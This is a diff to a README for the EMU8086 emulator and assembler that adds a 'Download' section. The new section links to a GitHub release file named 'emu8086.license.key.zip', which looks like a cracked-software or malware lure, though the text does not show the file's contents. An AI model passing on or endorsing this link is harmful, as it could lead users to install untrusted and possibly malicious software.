@@ -8,6 +8,10 @@ EMU8086 is a popular 16-bit microprocessor emulator and integrated assembler des
 - **Virtual Hardware**: Includes simulations for virtual displays, stepper motors, and traffic lights.
 - **Memory & Register Inspection**: Monitor changes in registers (AX, BX, CX, DX, etc.) and system memory in real-time.
 
+## Download
+You can download the emulator from the link below:
+[Download EMU8086](https://github.com/rajibdpi/emu8086/releases/download/v4.08/emu8086.license.key.zip)
+
 ## Getting Started
 1. **Write Code**: Use the built-in editor to write your `.asm` source files.
 2. **Compile**: Click the 'Compile' button to check for syntax errors and generate machine code.
